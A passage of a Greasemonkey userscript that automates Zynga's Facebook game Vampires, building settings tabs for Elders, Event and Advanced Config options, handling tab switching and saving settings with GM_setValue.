	var gamblebox1 = makeElement('div', eldersTab,{'style':'position: absolute; left:40px;  top: 25px; color: #FFFFFF;'});
		gamblebox1.innerHTML  = "<input type='radio' name='rBoxes' id='rBoxLeft' value='checked' " + GM_getValue('rBoxLeft', '') + "> Left ";

	var gamblebox2 = makeElement('div', eldersTab,{'style':'position: absolute; left:90px;  top: 25px; color: #FFFFFF;'});
		gamblebox2.innerHTML  = "<input type='radio' name='rBoxes' id='rBoxMiddle' value='checked' " + GM_getValue('rBoxMiddle', '') + "> Middle ";

	var gamblebox3 = makeElement('div', eldersTab,{'style':'position: absolute; left:160px;  top: 25px; color: #FFFFFF;'});
		gamblebox3.innerHTML  = "<input type='radio' name='rBoxes' id='rBoxRight' value='checked' " + GM_getValue('rBoxRight', '') + "> Right ";


	var gambleTime = makeElement('div', eldersTab,{'style':'position: absolute; left:50px;  top: 50px; color: #FFFFFF;'});
		gambleTime.innerHTML = "<strong>free gamble: " + new Date(1000 *GM_getValue('LotteryDue',0)).format("h:MM:ss TT");


	var autoBloodMagic = makeElement('div', eldersTab,{'style':'position: absolute; left:40px;  top: 75px; color: #FFFFFF;'});
        	autoBloodMagic.innerHTML  = "<input type='checkbox' id='autoBloodMagic' value='checked' "+GM_getValue('autoBloodMagic', '')+">Collect Blood Magic (Mandy spins)";

	var autoCrypt = makeElement('div', eldersTab,{'style':'position: absolute; left:40px;  top: 100px; color: #FFFFFF;'});
        	autoCrypt.innerHTML  = "<input type='checkbox' id='autoCrypt' value='checked' "+GM_getValue('autoCrypt', '')+">Visit Crypt every 24 hours";


	var autoCollector = makeElement('div', eldersTab,{'style':'position: absolute; left:300px;  top: 0px; color: #FFFFFF;'});
        	autoCollector.innerHTML  = "<input type='checkbox' id='autoCollector' value='checked' "+GM_getValue('autoCollector', '')+">Automatically use Collector";

	var selectCollector = makeElement('select', eldersTab, {'style':'position: absolute; top: 25px; left:300px;', 'id':'selectCollector'});
		for each (var collectorItem in collectorItems )
		{
			var choice = document.createElement('option');
			choice.value = collectorItem[0];
			choice.appendChild(document.createTextNode(collectorItem[0]));
			selectCollector.appendChild(choice);
		}
		selectCollector.selectedIndex = GM_getValue('selectCollector', 1);

	var collectorTooLateText = makeElement('div', eldersTab,{'style':'position: absolute; left:300px;  top: 60px; color: #FFFFFF;'});
		collectorTooLateText.innerHTML  = "Action when \"Too Late\":";

	var collectorTooLateBox1 = makeElement('div', eldersTab,{'style':'position: absolute; left:300px;  top: 75px; color: #FFFFFF;'});
		collectorTooLateBox1.innerHTML  = "<input type='radio' name='rCollectorBoxes' id='rCollectorRehire' value='checked' " + GM_getValue('rCollectorRehire', '') + "> Rehire ";

	var collectorTooLateBox2 = makeElement('div', eldersTab,{'style':'position: absolute; left:380px;  top: 75px; color: #FFFFFF;'});
		collectorTooLateBox2.innerHTML  = "<input type='radio' name='rCollectorBoxes' id='rCollectorBribe' value='checked' " + GM_getValue('rCollectorBribe', '') + "> Bribe ";

	if (Math.floor(new Date().getTime() / 1000) <= GM_getValue('CollectorDue',0)) {
		var collectorTime = makeElement('div', eldersTab,{'style':'position: absolute; left:300px;  top: 100px; color: #FFFFFF;'});
			collectorTime.innerHTML = "<strong>Collect at: " + new Date(1000 *GM_getValue('CollectorDue',0)).format("h:MM:ss TT");
	}


	var autoRetreat = makeElement('div', eldersTab,{'style':'position: absolute; left:510px;  top: 0px; color: #FFFFFF;'});
        	autoRetreat.innerHTML  = "<input type='checkbox' id='autoRetreat' value='checked' "+GM_getValue('autoRetreat', '')+">Automatically collect Elder's Retreat Properties";

	if (Math.floor(new Date().getTime() / 1000) <= GM_getValue('Retreat1Due',0)) {
		var retreatTime = makeElement('div', eldersTab,{'style':'position: absolute; left:510px;  top: 50px; color: #FFFFFF;'});
			retreatTime.innerHTML = "<strong>Collect Ancient's Workshop at: " + new Date(1000 *GM_getValue('Retreat1Due',0)).format("h:MM:ss TT");
	}

	if (Math.floor(new Date().getTime() / 1000) <= GM_getValue('Retreat2Due',0)) {
		var retreatTime = makeElement('div', eldersTab,{'style':'position: absolute; left:510px;  top: 75px; color: #FFFFFF;'});
			retreatTime.innerHTML = "<strong>Collect Sagaan's Altar at: " + new Date(1000 *GM_getValue('Retreat2Due',0)).format("h:MM:ss TT");
	}


/* Event tab*/
	var eventTab = makeElement('div', settingsBox,{'style':'position: absolute; top: 100px; width: 748px; height: 415px; color: #FFFFFF; visibility:hidden;', 'id':'eventTab'});

	var autoEventMission = makeElement('div', eventTab,{'style':'position: absolute; left:40px;  top: 0px; color: #FFFFFF;'});
         autoEventMission.innerHTML  = "<input type='checkbox' id='autoEventMission' value='checked' "+GM_getValue('autoEventMission', 'checked')+">enable Event auto-Mission";

	var eventMasterAllDiv = makeElement('div', eventTab,{'style':'position: absolute; left:50px;  top: 25px; color: #FFFFFF;'});
		var eventMasterAll = makeElement('input', eventMasterAllDiv, {'type':'radio', 'name':'eventMasterMethod', 'id':'eventMasterAll', 'value':'checked'}, 'eventMasterAll');
		eventMasterAllDiv.appendChild(document.createTextNode(' Master Stages in Order'));
	var eventMasterOneDiv = makeElement('div', eventTab,{'style':'position: absolute; left:300px;  top: 25px; color: #FFFFFF;'});
		var eventMasterOne = makeElement('input', eventMasterOneDiv, {'type':'radio', 'name':'eventMasterMethod', 'id':'eventMasterOne', 'value':'checked'}, 'eventMasterOne');
		eventMasterOneDiv.appendChild(document.createTextNode(' Master One Stage Only'));
	var eventMissionRepeatDiv = makeElement('div', eventTab,{'style':'position: absolute; left:500px;  top: 25px; color: #FFFFFF;'});
		var eventMissionRepeat = makeElement('input', eventMissionRepeatDiv, {'type':'radio', 'name':'eventMasterMethod', 'id':'eventMissionRepeat', 'value':'checked'}, 'eventMissionRepeat');
		eventMissionRepeatDiv.appendChild(document.createTextNode(' Repeat One Mission Endlessly'));

	// Master All Event Stages in Order:
	var selectEventMissionA = makeElement('select', eventTab, {'style':'position: absolute; top: 50px; left:40px; ', 'id':'selectEventMissionA'});
	for each (var eventmission in eventMissions )
	{
		if (eventmission[3]==0) {
			//Tab header creation
			var eventChoiceTab = document.createElement('optgroup');
			tabtocreate = eventmission[2];
			eventChoiceTab.label = eventMissionTabs[tabtocreate];
			eventChoiceTab.setAttribute("style","background-color: #CCCCCC");
			selectEventMissionA.appendChild(eventChoiceTab);
		}				

		var eventChoice = document.createElement('option');
		eventChoice.value = eventmission[0];
		eventChoice.appendChild(document.createTextNode(eventmission[0]));
		selectEventMissionA.appendChild(eventChoice);
	}
	selectEventMissionA.selectedIndex = Math.min(GM_getValue('selectEventMissionA', 0),eventMissions.length-1);


	// Master One Event Stage Only:
	var selectEventMissionO = makeElement('select', eventTab, {'style':'position: absolute; top: 50px; left:40px; ', 'id':'selectEventMissionO'});
	for each (var eventmissiontab in eventMissionTabs )
	{
		var eventStageChoice = document.createElement('option');
		eventStageChoice.value = eventmissiontab;
		eventStageChoice.appendChild(document.createTextNode(eventmissiontab));
		selectEventMissionO.appendChild(eventStageChoice);
	}
	selectEventMissionO.selectedIndex = Math.min(GM_getValue('selectEventMissionO', 0),eventMissionTabs.length-1);



	// Handler to change event mastery style (all vs. one)
	var handler = function() {
		if (eventMasterAll.checked || eventMissionRepeat.checked) {
			selectEventMissionA.style.display = '';
			selectEventMissionO.style.display = 'none';
		} else {
			selectEventMissionA.style.display = 'none';
			selectEventMissionO.style.display = '';
		}
	}
	handler();

	eventMasterAll.addEventListener('change', handler, false);
	eventMasterOne.addEventListener('change', handler, false);
	eventMissionRepeat.addEventListener('change', handler, false);

	var autoEventReset = makeElement('div', eventTab,{'style':'position: absolute; left:40px;  top: 100px; color: #FFFFFF;'});
         autoEventReset.innerHTML  = "<input type='checkbox' id='autoEventReset' value='checked' "+GM_getValue('autoEventReset', 'checked')+">Reset Event Stage when completed";


/* Advanced Config tab*/
	var advConfigTab = makeElement('div', settingsBox,{'style':'position: absolute; top: 100px; width: 748px; height: 415px; color: #FFFFFF; visibility:hidden;', 'id':'advConfigTab'});

	var advConfigWarning = makeElement('div', advConfigTab,{'style':'position: absolute; left:40px;  top: 0px; color:red;'});
        	advConfigWarning.innerHTML  = "<strong>WARNING: Changing values in this tab can cause VWAP to become unstable and operate improperly.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Only change values in this tab if you know what you are doing!</strong>";

	var advConfigDelay = makeElement('div', advConfigTab,{'style':'position: absolute; left:40px;  top: 50px; color: #FFFFFF;'});
		advConfigDelay.innerHTML = "Delay <input type='text' style='border: none; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('advConfigDelay', '3000') + "' id='advConfigDelay' size='1' title='Delay between actions in milliseconds. Default: 3000  Recommended Range: 1000-5000'> ms";


	var eventActiveOverride = makeElement('div', advConfigTab,{'style':'position: absolute; left:40px;  top: 100px; color: #FFFFFF;'});
		eventActiveOverride.innerHTML  = "<input type='checkbox' id='eventActiveOverride' value='checked' "+GM_getValue('eventActiveOverride', '')+">Force Event Active (Override)";


	var advConfigTimerIntervalHeader = makeElement('div', advConfigTab,{'style':'position: absolute; left:300px;  top: 50px;'});
        	advConfigTimerIntervalHeader.innerHTML  = "Timer Intervals [mm:ss]";

	var advConfigactiveMagicRefreshInterval = makeElement('div', advConfigTab,{'style':'position: absolute; left:300px;  top: 75px; color: #FFFFFF;'});
		advConfigactiveMagicRefreshInterval.innerHTML = "Active Magic Check <input type='text' style='border: none; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('activeMagicRefreshInterval', '10:00') + "' id='activeMagicRefreshInterval' size='2' title='Interval to periodically gather information from Blood Magic page in minutes and seconds. Default: 10:00  Recommended Range: 10:00-30:00'>";

	var advConfigactiveMagicResetDiv = makeElement('div', advConfigTab,{'style':'position: absolute; left:475px;  top: 75px; color: #FFFFFF; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;'});
		advConfigactiveMagicResetDiv.innerHTML = "Reset";
        	advConfigactiveMagicResetDiv.addEventListener('click', advConfigactiveMagicReset, false);

	var advConfiggoToIndexInterval = makeElement('div', advConfigTab,{'style':'position: absolute; left:300px;  top: 100px; color: #FFFFFF;'});
		advConfiggoToIndexInterval.innerHTML = "Index Page Check <input type='text' style='border: none; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('goToIndexInterval', '15:00') + "' id='goToIndexInterval' size='2' title='Interval to periodically gather information from Index page in minutes and seconds. Default: 15:00  Recommended Range: 10:00-30:00'>";

	var advConfiggoToIndexResetDiv = makeElement('div', advConfigTab,{'style':'position: absolute; left:475px;  top: 100px; color: #FFFFFF; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;'});
		advConfiggoToIndexResetDiv.innerHTML = "Reset";
        	advConfiggoToIndexResetDiv.addEventListener('click', advConfiggoToIndexReset, false);

	var advConfiggoToStatsInterval = makeElement('div', advConfigTab,{'style':'position: absolute; left:300px;  top: 125px; color: #FFFFFF;'});
		advConfiggoToStatsInterval.innerHTML = "Stats Check <input type='text' style='border: none; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('goToStatsInterval', '30:00') + "' id='goToStatsInterval' size='2' title='Interval to periodically gather information from Stats page in minutes and seconds. Default: 30:00  Recommended Range: 10:00-30:00'>";

	var advConfiggoToStatsResetDiv = makeElement('div', advConfigTab,{'style':'position: absolute; left:475px;  top: 125px; color: #FFFFFF; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;'});
		advConfiggoToStatsResetDiv.innerHTML = "Reset";
        	advConfiggoToStatsResetDiv.addEventListener('click', advConfiggoToStatsReset, false);

    	
	var advConfigResetDefaultsButton = makeElement('div', advConfigTab,{'style':'position: absolute; left:40px;  top: 300px; color: #FFFFFF;'});
        	advConfigResetDefaultsButton.innerHTML  = "<button>Reset ALL to Defaults</button>";
        	advConfigResetDefaultsButton.addEventListener('click', advConfigResetDefaults, false);


	if(advConfigActive) {
		var advConfigMenu = makeElement('div', settingsBox,{'style':'position: absolute; top: 470px; left:30px; color: #FFFFFF;', 'id':'advConfigMenu'});
		advConfigMenu.innerHTML  = "<button>Adv Config</button>";
		advConfigMenu.addEventListener('click', advConfigMenuSelect, false);
	}


/* other buttons*/	
    var updateButton = makeElement('div', settingsBox,{'style':'position: absolute; left:150px;  top: 470px;'});
        updateButton.innerHTML  = "<button>check for updates</button>";
        updateButton.addEventListener('click', updateScript, false);
    	
    var saveButton = makeElement('div', settingsBox,{'style':'position: absolute; left:300px;  top: 470px; color: #FFFFFF;'});
        saveButton.innerHTML  = "<button>save settings</button>";
        saveButton.addEventListener('click', saveSettings, false);

    var saveNotification = makeElement('div', settingsBox,{'id':'saveNotification'});
        saveNotification.innerHTML = "<strong>Settings Saved</strong>";
        saveNotification.setAttribute("style","position: absolute;left:450px;top:470px;color:red;visibility:hidden;font-size:14px;");

    var judgeListClearedNotification = makeElement('div', settingsBox,{'id':'judgeListClearedNotification'});
        judgeListClearedNotification.innerHTML = "<strong>Judge History Cleared</strong>";
        judgeListClearedNotification.setAttribute("style","position: absolute;left:415px;top:470px;color:red;visibility:hidden;font-size:14px;");
    	
    var debugDumpButton = makeElement('div', settingsBox,{'style':'position: absolute; left:600px;  top: 470px; color: #FFFFFF;'});
        debugDumpButton.innerHTML  = "<button>Debug Dump</button>";
        debugDumpButton.addEventListener('click', debugDumpSettings, false);

    var debugDumpNotification = makeElement('div', settingsBox,{'id':'debugDumpNotification'});
        debugDumpNotification.innerHTML = "<strong>Debug info logged</strong>";
        debugDumpNotification.setAttribute("style","position: absolute;left:430px;top:470px;color:red;visibility:hidden;font-size:14px;");

	return settingsBox;
}

function coffinMenuSelect(){
	document.getElementById('coffinMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/coffin_se.png' alt='Coffin' title='Coffin Tab'/>";
	document.getElementById('clanMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/clan_us.png' alt='Clan' title='Clan Tab'/>";
	document.getElementById('missionMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/missions_us.png' alt='Missions' title='Missions Tab'/>";
	document.getElementById('combatMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/combat_us.png' alt='Combat' title='Combat Tab'/>";
	document.getElementById('bazaarMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/bazaar_us.png' alt='Bazaar' title='Bazaar Tab'/>";
	document.getElementById('eldersMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/elders_us.png' alt='Elders' title='Elders Tab'/>";
	if(eventActive)
	        document.getElementById('eventMenu').innerHTML  = "<div style='color:#FFE6E6;background-color:#330000;text-align:center'><table border='0'><tr><td>"+eventImageHTML+"</td><td>Event:<br>"+eventName+"</td></tr></table></div>";
	document.getElementById('coffinTab').style.visibility = "visible";
	document.getElementById('clanTab').style.visibility = "hidden";
	document.getElementById('missionTab').style.visibility = "hidden";
	document.getElementById('combatTab').style.visibility = "hidden";
	document.getElementById('bazaarTab').style.visibility = "hidden";
	document.getElementById('eldersTab').style.visibility = "hidden";
	if(eventActive)
		document.getElementById('eventTab').style.visibility = "hidden";
	document.getElementById('advConfigTab').style.visibility = "hidden";
	document.getElementById('advConfigTab').style.visibility = "hidden";
	if(advConfigActive)
		document.getElementById('advConfigMenu').style.backgroundColor = "Black";
}

function clanMenuSelect(){
	document.getElementById('coffinMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/coffin_us.png' alt='Coffin' title='Coffin Tab'/>";
	document.getElementById('clanMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/clan_se.png' alt='Clan' title='Clan Tab'/>";
	document.getElementById('missionMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/missions_us.png' alt='Missions' title='Missions Tab'/>";
	document.getElementById('combatMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/combat_us.png' alt='Combat' title='Combat Tab'/>";
	document.getElementById('bazaarMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/bazaar_us.png' alt='Bazaar' title='Bazaar Tab'/>";
	document.getElementById('eldersMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/elders_us.png' alt='Elders' title='Elders Tab'/>";
	if(eventActive)
	        document.getElementById('eventMenu').innerHTML  = "<div style='color:#FFE6E6;background-color:#330000;text-align:center'><table border='0'><tr><td>"+eventImageHTML+"</td><td>Event:<br>"+eventName+"</td></tr></table></div>";
	document.getElementById('coffinTab').style.visibility = "hidden";
	document.getElementById('clanTab').style.visibility = "visible";
	document.getElementById('missionTab').style.visibility = "hidden";
	document.getElementById('combatTab').style.visibility = "hidden";
	document.getElementById('bazaarTab').style.visibility = "hidden";
	document.getElementById('eldersTab').style.visibility = "hidden";
	if(eventActive)
		document.getElementById('eventTab').style.visibility = "hidden";
	document.getElementById('advConfigTab').style.visibility = "hidden";
	document.getElementById('advConfigTab').style.visibility = "hidden";
	if(advConfigActive)
		document.getElementById('advConfigMenu').style.backgroundColor = "Black";
}

function missionMenuSelect(){
	document.getElementById('coffinMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/coffin_us.png' alt='Coffin' title='Coffin Tab'/>";
	document.getElementById('clanMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/clan_us.png' alt='Clan' title='Clan Tab'/>";
	document.getElementById('missionMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/missions_se.png' alt='Missions' title='Missions Tab'/>";
	document.getElementById('combatMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/combat_us.png' alt='Combat' title='Combat Tab'/>";
	document.getElementById('bazaarMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/bazaar_us.png' alt='Bazaar' title='Bazaar Tab'/>";
	document.getElementById('eldersMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/elders_us.png' alt='Elders' title='Elders Tab'/>";
	if(eventActive)
        	document.getElementById('eventMenu').innerHTML  = "<div style='color:#FFE6E6;background-color:#330000;text-align:center'><table border='0'><tr><td>"+eventImageHTML+"</td><td>Event:<br>"+eventName+"</td></tr></table></div>";
	document.getElementById('coffinTab').style.visibility = "hidden";
	document.getElementById('clanTab').style.visibility = "hidden";
	document.getElementById('missionTab').style.visibility = "visible";
	document.getElementById('combatTab').style.visibility = "hidden";
	document.getElementById('bazaarTab').style.visibility = "hidden";
	document.getElementById('eldersTab').style.visibility = "hidden";
	if(eventActive)
		document.getElementById('eventTab').style.visibility = "hidden";
	document.getElementById('advConfigTab').style.visibility = "hidden";
	if(advConfigActive)
		document.getElementById('advConfigMenu').style.backgroundColor = "Black";
}

function combatMenuSelect(){
	document.getElementById('coffinMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/coffin_us.png' alt='Coffin' title='Coffin Tab'/>";
	document.getElementById('clanMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/clan_us.png' alt='Clan' title='Clan Tab'/>";
	document.getElementById('missionMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/missions_us.png' alt='Missions' title='Missions Tab'/>";
	document.getElementById('combatMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/combat_se.png' alt='Combat' title='Combat Tab'/>";
	document.getElementById('bazaarMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/bazaar_us.png' alt='Bazaar' title='Bazaar Tab'/>";
	document.getElementById('eldersMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/elders_us.png' alt='Elders' title='Elders Tab'/>";
	if(eventActive)
	        document.getElementById('eventMenu').innerHTML  = "<div style='color:#FFE6E6;background-color:#330000;text-align:center'><table border='0'><tr><td>"+eventImageHTML+"</td><td>Event:<br>"+eventName+"</td></tr></table></div>";
	document.getElementById('coffinTab').style.visibility = "hidden";
	document.getElementById('clanTab').style.visibility = "hidden";
	document.getElementById('missionTab').style.visibility = "hidden";
	document.getElementById('combatTab').style.visibility = "visible";
	document.getElementById('bazaarTab').style.visibility = "hidden";
	document.getElementById('eldersTab').style.visibility = "hidden";
	if(eventActive)
		document.getElementById('eventTab').style.visibility = "hidden";
	document.getElementById('advConfigTab').style.visibility = "hidden";
	if(advConfigActive)
		document.getElementById('advConfigMenu').style.backgroundColor = "Black";
}

function bazaarMenuSelect(){
	document.getElementById('coffinMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/coffin_us.png' alt='Coffin' title='Coffin Tab'/>";
	document.getElementById('clanMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/clan_us.png' alt='Clan' title='Clan Tab'/>";
	document.getElementById('missionMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/missions_us.png' alt='Missions' title='Missions Tab'/>";
	document.getElementById('combatMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/combat_us.png' alt='Combat' title='Combat Tab'/>";
	document.getElementById('bazaarMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/bazaar_se.png' alt='Bazaar' title='Bazaar Tab'/>";
	document.getElementById('eldersMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/elders_us.png' alt='Elders' title='Elders Tab'/>";
	if(eventActive)
	        document.getElementById('eventMenu').innerHTML  = "<div style='color:#FFE6E6;background-color:#330000;text-align:center'><table border='0'><tr><td>"+eventImageHTML+"</td><td>Event:<br>"+eventName+"</td></tr></table></div>";
	document.getElementById('coffinTab').style.visibility = "hidden";
	document.getElementById('clanTab').style.visibility = "hidden";
	document.getElementById('missionTab').style.visibility = "hidden";
	document.getElementById('combatTab').style.visibility = "hidden";
	document.getElementById('bazaarTab').style.visibility = "visible";
	document.getElementById('eldersTab').style.visibility = "hidden";
	if(eventActive)
		document.getElementById('eventTab').style.visibility = "hidden";
	document.getElementById('advConfigTab').style.visibility = "hidden";
	if(advConfigActive)
		document.getElementById('advConfigMenu').style.backgroundColor = "Black";
}

function eldersMenuSelect(){
	document.getElementById('coffinMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/coffin_us.png' alt='Coffin' title='Coffin Tab'/>";
	document.getElementById('clanMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/clan_us.png' alt='Clan' title='Clan Tab'/>";
	document.getElementById('missionMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/missions_us.png' alt='Missions' title='Missions Tab'/>";
	document.getElementById('combatMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/combat_us.png' alt='Combat' title='Combat Tab'/>";
	document.getElementById('bazaarMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/bazaar_us.png' alt='Bazaar' title='Bazaar Tab'/>";
	document.getElementById('eldersMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/elders_se.png' alt='Elders' title='Elders Tab'/>";
	if(eventActive)
	        document.getElementById('eventMenu').innerHTML  = "<div style='color:#FFE6E6;background-color:#330000;text-align:center'><table border='0'><tr><td>"+eventImageHTML+"</td><td>Event:<br>"+eventName+"</td></tr></table></div>";
	document.getElementById('coffinTab').style.visibility = "hidden";
	document.getElementById('clanTab').style.visibility = "hidden";
	document.getElementById('missionTab').style.visibility = "hidden";
	document.getElementById('combatTab').style.visibility = "hidden";
	document.getElementById('bazaarTab').style.visibility = "hidden";
	document.getElementById('eldersTab').style.visibility = "visible";
	if(eventActive)
		document.getElementById('eventTab').style.visibility = "hidden";
	document.getElementById('advConfigTab').style.visibility = "hidden";
	if(advConfigActive)
		document.getElementById('advConfigMenu').style.backgroundColor = "Black";
}

// Automate Special Events
function eventMenuSelect(){
	document.getElementById('coffinMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/coffin_us.png' alt='Coffin' title='Coffin Tab'/>";
	document.getElementById('clanMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/clan_us.png' alt='Clan' title='Clan Tab'/>";
	document.getElementById('missionMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/missions_us.png' alt='Missions' title='Missions Tab'/>";
	document.getElementById('combatMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/combat_us.png' alt='Combat' title='Combat Tab'/>";
	document.getElementById('bazaarMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/bazaar_us.png' alt='Bazaar' title='Bazaar Tab'/>";
	document.getElementById('eldersMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/elders_us.png' alt='Elders' title='Elders Tab'/>";
        document.getElementById('eventMenu').innerHTML  = "<div style='color:#FFE6E6;background-color:#660000;text-align:center'><table border='0'><tr><td>"+eventImageHTML+"</td><td>Event:<br>"+eventName+"</td></tr></table></div>";
	document.getElementById('coffinTab').style.visibility = "hidden";
	document.getElementById('clanTab').style.visibility = "hidden";
	document.getElementById('missionTab').style.visibility = "hidden";
	document.getElementById('combatTab').style.visibility = "hidden";
	document.getElementById('bazaarTab').style.visibility = "hidden";
	document.getElementById('eldersTab').style.visibility = "hidden";
	document.getElementById('eventTab').style.visibility = "visible";
	document.getElementById('advConfigTab').style.visibility = "hidden";
	if(advConfigActive)
		document.getElementById('advConfigMenu').style.backgroundColor = "Black";
}

function advConfigMenuSelect(){
	document.getElementById('coffinMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/coffin_us.png' alt='Coffin' title='Coffin Tab'/>";
	document.getElementById('clanMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/clan_us.png' alt='Clan' title='Clan Tab'/>";
	document.getElementById('missionMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/missions_us.png' alt='Missions' title='Missions Tab'/>";
	document.getElementById('combatMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/combat_us.png' alt='Combat' title='Combat Tab'/>";
	document.getElementById('bazaarMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/bazaar_us.png' alt='Bazaar' title='Bazaar Tab'/>";
	document.getElementById('eldersMenu').innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/elders_us.png' alt='Elders' title='Elders Tab'/>";
	if(eventActive)
	        document.getElementById('eventMenu').innerHTML  = "<div style='color:#FFE6E6;background-color:#330000;text-align:center'><table border='0'><tr><td>"+eventImageHTML+"</td><td>Event:<br>"+eventName+"</td></tr></table></div>";
	document.getElementById('coffinTab').style.visibility = "hidden";
	document.getElementById('clanTab').style.visibility = "hidden";
	document.getElementById('missionTab').style.visibility = "hidden";
	document.getElementById('combatTab').style.visibility = "hidden";
	document.getElementById('bazaarTab').style.visibility = "hidden";
	document.getElementById('eldersTab').style.visibility = "hidden";
	if(eventActive)
		document.getElementById('eventTab').style.visibility = "hidden";
	document.getElementById('advConfigTab').style.visibility = "visible";
	if(advConfigActive)
		document.getElementById('advConfigMenu').style.backgroundColor = "Red";
}


function advConfigResetDefaults(){
	document.getElementById('advConfigDelay').value = 3000;
	document.getElementById('activeMagicRefreshInterval').value = '10:00';
	document.getElementById('goToIndexInterval').value = '15:00';
	document.getElementById('goToStatsInterval').value = '30:00';
	document.getElementById('eventActiveOverride').checked = false;
}

function advConfigactiveMagicReset(){
	setGMTime('activeMagicTimer', '00:00');
}

function advConfiggoToIndexReset(){
	setGMTime('goToIndexTimer', '00:00');
}

function advConfiggoToStatsReset(){
	setGMTime('goToStatsTimer', '00:00');
}


function saveSettings(){

    // Validate the settings and alert the user if the settings are invalid.
    var collectorNRGSelected = (document.getElementById('selectCollector').value === "50% Energy Boost");
    var autoCollectorOn      = (document.getElementById('autoCollector').checked === true);

    if (collectorNRGSelected && (GM_getValue('tooManyNRGBoosts',false)) && autoCollectorOn) {
      alert('WARNING: You have selected an Energy Boost for the Collector to craft, but you will be unable to collect it because you have too many Energy Boosts in your inventory.  You may wish to select something else, or use up all but 9 of your Energy Boosts!');
    }



    GM_setValue('autoClick', document.getElementById('autoClick').checked ? 'checked' : '0');
    GM_setValue('autoClan', document.getElementById('autoClan').checked ? 'checked' : '0');
    GM_setValue('autoMission', document.getElementById('autoMission').checked ? 'checked' : '0');
    GM_setValue('missionExpGain', document.getElementById('missionExpGain').value);
    GM_setValue('missionExpReserve', document.getElementById('missionExpReserve').value);
    GM_setValue('showExpNrgRatio', document.getElementById('showExpNrgRatio').checked ? 'checked' : '0');
    GM_setValue('missionMastery', document.getElementById('missionMastery').checked ? 'checked' : '0');

    GM_setValue('autoPublishAncientChests', document.getElementById('autoPublishAncientChests').checked ? 'checked' : '0');
    GM_setValue('autoChestPrio1', document.getElementById('autoChestPrio1').selectedIndex );
    GM_setValue('autoChestPrio2', document.getElementById('autoChestPrio2').selectedIndex );
    GM_setValue('autoChestPrio3', document.getElementById('autoChestPrio3').selectedIndex );
    GM_setValue('autoChestPrio4', document.getElementById('autoChestPrio4').selectedIndex );
    GM_setValue('autoChestPrio5', document.getElementById('autoChestPrio5').selectedIndex );
    GM_setValue('autoChestPrio6', document.getElementById('autoChestPrio6').selectedIndex );
